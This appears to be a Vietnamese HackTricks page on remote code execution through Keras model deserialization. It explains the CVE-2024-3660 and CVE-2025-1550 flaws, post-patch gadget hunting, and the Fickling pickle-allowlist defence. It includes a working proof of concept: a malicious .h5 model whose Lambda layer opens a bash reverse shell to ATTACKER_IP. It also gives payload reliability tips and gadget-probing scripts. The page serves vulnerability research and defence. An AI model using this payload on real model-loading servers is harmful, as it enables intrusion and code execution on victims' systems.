# RCE trong quá trình giải tuần tự hóa mô hình Keras và săn tìm gadget

{{#include ../banners/hacktricks-training.md}}

Trang này tóm tắt các kỹ thuật khai thác thực tế nhắm vào pipeline giải tuần tự hóa mô hình Keras, giải thích cấu trúc bên trong của định dạng .keras gốc và bề mặt tấn công, đồng thời cung cấp bộ công cụ dành cho nhà nghiên cứu để tìm các lỗ hổng trong tệp mô hình (MFV) và gadget sau khi vá lỗi.

## Cấu trúc bên trong của định dạng mô hình .keras

Tệp .keras là một kho lưu trữ ZIP chứa ít nhất:<sup>[[1]](#references)</sup>
- metadata.json – thông tin chung (ví dụ: phiên bản Keras)
- config.json – kiến trúc mô hình (bề mặt tấn công chính)
- model.weights.h5 – trọng số trong HDF5

config.json điều khiển quá trình giải tuần tự hóa đệ quy: Keras nhập các module, phân giải các lớp/hàm và dựng lại các layer/đối tượng từ các dictionary do kẻ tấn công kiểm soát.<sup>[[1]](#references)</sup>

Ví dụ về một đối tượng Dense layer:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization thực hiện:<sup>[[1]](#references)</sup>
- Import module và phân giải symbol từ các khóa module/class_name
- Gọi from_config(...) hoặc constructor với kwargs do attacker kiểm soát
- Đệ quy vào các object lồng nhau (activations, initializers, constraints, v.v.)

Trong lịch sử, điều này đã cung cấp cho attacker đang tạo config.json ba primitive:<sup>[[1]](#references)</sup>
- Kiểm soát các module được import
- Kiểm soát các class/function được phân giải
- Kiểm soát kwargs được truyền vào constructor/from_config

## CVE-2024-3660 – RCE bằng bytecode của Lambda layer

Nguyên nhân gốc:
- Deserialization Lambda kiểu cũ dựng lại một hàm Python từ mã marshal do attacker kiểm soát: `func_load()` giải mã base64 payload, gọi `marshal.loads()` và tạo một `FunctionType`. Bytecode của hàm được tạo sẽ chạy khi Lambda được gọi, và các loader trước phiên bản 2.13 bị ảnh hưởng không thực thi kiểm tra safe-mode đối với các định dạng kiểu cũ.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Trong một archive Keras v3 nguyên bản, hàm Lambda được biểu diễn dưới dạng object `__lambda__`, có trường `code` chứa mã marshal được mã hóa base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Biện pháp giảm thiểu:
- Keras mặc định bật `safe_mode=True` cho định dạng Keras v3 gốc. Các lambda Python được serialize trong `Lambda` sẽ bị chặn, trừ khi người dùng chủ động tắt bằng `safe_mode=False`; biện pháp bảo vệ này không áp dụng tương tự cho các định dạng cũ.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Ghi chú:
- Các định dạng cũ (bản lưu HDF5 cũ hơn) hoặc codebase cũ có thể không thực thi các kiểm tra hiện đại, vì vậy các cuộc tấn công kiểu “downgrade” vẫn có thể xảy ra khi nạn nhân dùng loader cũ.

## CVE-2025-1550 – Import module tùy ý trong Keras 3.0.0–3.8.x

Nguyên nhân gốc:
- `_retrieve_class_or_fn` dùng `importlib.import_module(module)` với chuỗi module do kẻ tấn công kiểm soát lấy từ `config.json`.
- Tác động: Một archive `.keras` được tạo có chủ đích có thể khiến `Model.load_model()` import các module và hàm Python do kẻ tấn công lựa chọn, gây tác dụng phụ khi import và nhận các đối số do kẻ tấn công kiểm soát, ngay cả khi `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ý tưởng khai thác:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Các cải tiến bảo mật (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Danh sách cho phép module: chỉ cho phép import các module thuộc hệ sinh thái chính thức: keras, keras_hub, keras_cv, keras_nlp
- Chế độ an toàn mặc định: safe_mode=True chặn việc tải các hàm được tuần tự hóa không an toàn trong Lambda
- Kiểm tra kiểu cơ bản: các đối tượng được giải tuần tự phải khớp với kiểu dự kiến

## Khai thác thực tế: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Các bản triển khai TensorFlow-Keras cũ có thể vẫn chấp nhận tệp model HDF5 (`.h5`). Nếu kẻ tấn công có thể tải lên một model mà máy chủ sau đó tải hoặc chạy inference, loader bị ảnh hưởng có thể giải tuần tự một Lambda layer chứa Python do kẻ tấn công kiểm soát, từ đó thực thi mã trong quy trình xử lý model của ứng dụng.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC tối giản để tạo một tệp .h5 độc hại, trong đó Lambda thực thi reverse shell khi mục tiêu gọi model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Ghi chú và mẹo tăng độ tin cậy:
- Điểm kích hoạt thay đổi tùy theo định dạng và quy trình; bài viết được dẫn đã ghi nhận payload thực thi hai lần trong quá trình dự đoán. Hãy coi các tác dụng phụ có thể lặp lại và thiết kế payload theo hướng idempotent.<sup>[[7]](#references)</sup>
- Cố định phiên bản: khớp TF/Keras/Python của nạn nhân để tránh lỗi không tương thích khi serialization. Ví dụ, tạo artifact bằng Python 3.8 với TensorFlow 2.13.1 nếu đó là phiên bản mục tiêu đang dùng.<sup>[[7]](#references)</sup>
- Tái tạo môi trường nhanh:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Xác thực: payload lành tính như os.system("ping -c 1 YOUR_IP") giúp xác nhận mã được thực thi (ví dụ: quan sát ICMP bằng tcpdump) trước khi chuyển sang reverse shell.<sup>[[7]](#references)</sup>

## Bề mặt gadget sau bản vá bên trong allowlist

Ngay cả với allowlist module Keras và safe mode, các callable được cho phép vẫn có thể gây ra tác dụng phụ. Ví dụ, `keras.utils.get_file` tải xuống một URL và ghi tệp vào vị trí cache đã cấu hình, khiến nó trở thành ứng viên để phân tích gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Cấu hình Lambda ứng viên (xác thực chữ ký lời gọi trong một thử nghiệm có kiểm soát):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Giới hạn quan trọng:
- `Lambda.call()` luôn truyền input của model làm đối số vị trí đầu tiên và `arguments` đã cấu hình làm đối số từ khóa. Với `get_file`, giá trị vị trí đó được gán cho `fname`; sự không khớp giữa tensor và path có thể khiến candidate này thất bại trước khi tải xuống, nên đây không phải gadget chắc chắn hoạt động.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlist import ML pickle cho các model AI/ML (Fickling)

Nhiều định dạng model AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artifact của joblib/scikit-learn và các định dạng native Python khác) nhúng dữ liệu Python pickle. Thay vào đó, legacy Keras Lambda path ở trên sử dụng bytecode hàm đã được marshal, nên đây là một rủi ro deserialization riêng biệt. Các opcode của pickle có thể thực thi hành vi do attacker kiểm soát trong quá trình deserialization, bao gồm sửa đổi model hoặc RCE, và các scanner đơn giản có thể bỏ sót những import nguy hiểm mới hoặc chưa được liệt kê.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Một biện pháp phòng thủ fail-closed thiết thực là hook deserializer pickle của Python và chỉ cho phép một tập hợp đã được rà soát gồm các import vô hại liên quan đến ML trong quá trình unpickling. Fickling của Trail of Bits triển khai chính sách này và cung cấp allowlist import ML được tuyển chọn từ hàng nghìn pickle công khai trên Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Mô hình bảo mật cho các import “an toàn” (những nhận định được đúc kết từ nghiên cứu và thực tiễn): các symbol được pickle sử dụng phải đồng thời đáp ứng các điều kiện sau:<sup>[[8]](#references)</sup>
- Không thực thi code hoặc gây ra việc thực thi (không có code object đã biên dịch/mã nguồn, gọi shell, hook, v.v.)
- Không thể tùy ý lấy/đặt thuộc tính hoặc phần tử
- Không import hoặc lấy tham chiếu đến các Python object khác từ pickle VM
- Không kích hoạt bất kỳ deserializer thứ cấp nào (ví dụ: marshal, pickle lồng nhau), kể cả gián tiếp

Bật các biện pháp bảo vệ của Fickling càng sớm càng tốt khi khởi động process, để mọi lệnh tải pickle do framework thực hiện (`torch.load`, `joblib.load`, v.v.) đều được kiểm tra:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Mẹo vận hành:
- Bạn có thể tạm thời vô hiệu hóa/kích hoạt lại các hook khi cần:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Nếu một model đã biết là an toàn bị chặn, hãy mở rộng allowlist cho môi trường của bạn sau khi xem xét các symbol:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling cũng cung cấp các runtime guard tổng quát nếu bạn muốn kiểm soát chi tiết hơn:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() để bắt buộc kiểm tra mọi lần gọi pickle.load()
  - with fickling.check_safety(): để áp dụng kiểm tra trong phạm vi cụ thể
  - fickling.load(path) / fickling.is_likely_safe(path) để kiểm tra riêng lẻ

- Ưu tiên các định dạng model không dùng pickle khi có thể (ví dụ: SafeTensors).<sup>[[15]](#references)</sup> Nếu buộc phải chấp nhận pickle, hãy chạy loader với quyền hạn tối thiểu, không cho phép kết nối mạng đi ra và thực thi allowlist.

Chiến lược ưu tiên allowlist này đã chứng minh khả năng chặn các đường khai thác ML pickle phổ biến mà vẫn duy trì khả năng tương thích cao. Trong benchmark của ToB, Fickling phát hiện 100% các tệp độc hại tổng hợp và cho phép khoảng 99% tệp sạch từ các repo Hugging Face hàng đầu.<sup>[[8]](#references)[[10]](#references)</sup>


## Bộ công cụ nghiên cứu

1) Khám phá gadget có hệ thống trong các module được cho phép

Liệt kê các callable tiềm năng trong keras, keras_nlp, keras_cv, keras_hub và ưu tiên những callable có tác động phụ lên file/mạng/quy trình/môi trường.<sup>[[1]](#references)</sup>

<details>
<summary>Liệt kê các callable có khả năng nguy hiểm trong các module Keras thuộc allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Kiểm thử giải tuần tự hóa trực tiếp (không cần archive .keras)

Truyền các dict được tạo có chủ đích trực tiếp vào bộ giải tuần tự hóa của Keras để tìm hiểu các tham số được chấp nhận và quan sát các tác dụng phụ.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Thăm dò xuyên phiên bản và định dạng

Keras tồn tại trong nhiều codebase/era với các cơ chế bảo vệ và định dạng khác nhau:<sup>[[1]](#references)</sup>
- Keras tích hợp trong TensorFlow: tensorflow/python/keras (legacy, dự kiến bị xóa)
- tf-keras: được duy trì riêng
- Keras 3 đa backend (chính thức): giới thiệu định dạng .keras native

Lặp lại các bài kiểm tra trên nhiều codebase và định dạng (.keras so với HDF5 legacy) để phát hiện hồi quy hoặc thiếu cơ chế bảo vệ.

## References

- [1] [Săn tìm lỗ hổng trong quá trình giải tuần tự hóa model Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Bổ sung kiểm tra cho serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE khi giải tuần tự hóa Lambda trong Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import module tùy ý trong Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Báo cáo huntr – import tùy ý #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Báo cáo huntr – import tùy ý #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda TensorFlow .h5 lên root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – Trình quét file pickle AI/ML mới của Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Bảo vệ môi trường AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus benchmark quét pickle của Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Tổng quan về các cuộc tấn công Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Dự án SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Lambda Layers trong Keras 2 cho phép chèn mã tùy ý](https://kb.cert.org/vuls/id/253266)
- [17] [Mã nguồn lớp Lambda của Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Mã nguồn tiện ích Python của Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` của Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
